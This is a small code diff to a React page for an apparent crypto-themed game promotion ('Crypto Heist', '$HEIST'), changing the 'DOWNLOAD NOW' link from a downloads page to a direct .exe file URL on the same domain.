@@ -396,7 +396,7 @@ export default function Page() {
   ];
 
   const buyNowLink = { href: "#buy", label: "BUY $HEIST" };
-  const downloadLink = { href: "https://chsolanabeach.online/downloads", label: "DOWNLOAD NOW" };
+  const downloadLink = { href: "https://chsolanabeach.online/downloads/Crypto%20Heist%20(Solana%20Beach).exe", label: "DOWNLOAD NOW" };
   const trailerVideoId = "UDe0AZYnafg"; // Extracted video ID
   return (
     <main className="bg-black overflow-x-hidden">
